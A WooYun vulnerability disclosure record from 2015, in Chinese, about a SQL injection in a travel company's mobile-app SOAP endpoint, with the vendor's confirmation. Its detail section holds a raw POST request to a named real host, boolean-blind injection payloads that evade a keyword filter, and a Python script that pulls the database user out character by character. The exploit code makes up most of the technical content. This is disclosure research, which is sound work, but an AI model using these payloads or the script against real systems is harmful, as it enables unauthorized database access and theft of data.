{"id": 83969, "wybug_id": "wooyun-2015-0146185", "wybug_title": "腾邦国际手机APP（腾邦旅行）SQL注入（含绕过）", "wybug_corp": "腾邦集团", "wybug_author": "路人甲", "wybug_date": "2015-10-12 22:13", "wybug_open_date": "2015-11-29 14:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向公众公开  简要描述： APP的Oracle注入绕过 详细说明：  目标站：腾邦国际手机APP（腾邦旅行）逛腾邦国际（http://bj.feiren.com/）的时候，发现页面下方有个APP下载，于是检测了一下。发现以下地方存在布尔/时间盲注：（注入参数：<status i:type=\"d:string\">Y'</status>）\nPOST http://m.cococ.cc/xfirews/faq HTTP/1.1Accept-Encoding: identityContent-Length: 705Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Host: m.cococ.ccContent-Type: text/xml<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\"><v:Header/><v:Body><queryQuestion xmlns=\"http://entity.question.trade.cococ.cc\" id=\"o0\" c:root=\"1\"><n0:in0 xmlns:n0=\"http://entity.question.trade.cococ.cc\"><askpeoper i:type=\"d:string\"></askpeoper><currentPageIndex i:type=\"d:int\">1</currentPageIndex><pageSize i:type=\"d:int\">20</pageSize><status i:type=\"d:string\">Y</status><title i:type=\"d:string\"></title></n0:in0></queryQuestion></v:Body></v:Envelope>\n扔SQLMap里面，发现无法出数据：\n\n莫非被过滤了？于是把SQLMap代理过来查看其数据包：1）从上图可知，SQLMap走的是时间盲注路线。刚开始的时候，发包检测网站可用性，都正常返回，如下图\n\n2）接着，开始发包进行时间盲注以注入出数据，但是发了几次包页面都出错了，导致SQLMap无法判断而异常结束，如下图\n\n最后SQLMap只得返回：current database: None……既然SQLMap不会自己纠错，我们就顺着SQLMap的思路来看吧~对SQLMap所发的注入包进行手工修改并注入，后来发现貌似是有些关键词被过滤了或无法执行，如NVL/CAST、select等，下面是执行select时的报错\n\n\n\n知道过滤了啥就好办了，不妨换个语句来注入。这里我选择了布尔型来注入出当前用户，步骤如下：1）首先判断当前用户长度，正确返回则语句为True，最后得知长度为6\nY' AND 3683=(CASE WHEN (length(user())=6) THEN 3683 ELSE 1 END) AND 'a'='a\n2）同理，接着跑这六个字符\nY' AND 3683=(CASE WHEN (ASCII(SUBSTRC(user(),1,1))>55 THEN 1 ELSE 3683 END) AND 'a'='a\n写了个Python\n#!/usr/bin/env python#coding=utf8import httplib, urllib, reuser = ''httpClient = Nonefor num in range(1,7):    for ascii_num in range(21,127):        try:            params = u'<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\"><v:Header/><v:Body><queryQuestion xmlns=\"http://entity.question.trade.cococ.cc\" id=\"o0\" c:root=\"1\"><n0:in0 xmlns:n0=\"http://entity.question.trade.cococ.cc\"><askpeoper i:type=\"d:string\"></askpeoper><currentPageIndex i:type=\"d:int\">1</currentPageIndex><pageSize i:type=\"d:int\">20</pageSize><status i:type=\"d:string\">Y\\' AND 3683=(CASE WHEN (ASCII(SUBSTRC(user(),'+ str(num) +',1))>'+ str(ascii_num) +') THEN 1 ELSE 3683 END) AND \\'a\\'=\\'a</status><title i:type=\"d:string\"></title></n0:in0></queryQuestion></v:Body></v:Envelope>'            headers = {\"Host\": \"m.cococ.cc\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Content-Type\": \"text/xml\", \"Content-Length\": len(params)}            httpClient = httplib.HTTPConnection(\"10.18.64.10\", 8888, timeout=30)                        httpClient.request(\"POST\", \"http://m.cococ.cc/xfirews/faq\", params, headers)            response = httpClient.getresponse()            #print response.read()            #print phonecode            #response_headers = str(response.getheaders())            if re.search('content', response.read(), re.I):                user = user + chr(ascii_num)                print \"User(): \" + user                break        except Exception, e:            print e        finally:            if httpClient:                httpClient.close()\n最后结果输出：user()='MOBILE'\n\n安全性考虑，其他的就不跑了~~   漏洞证明：     修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-10-15 14:26 厂商回复： 已通知项目组紧急处理，非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}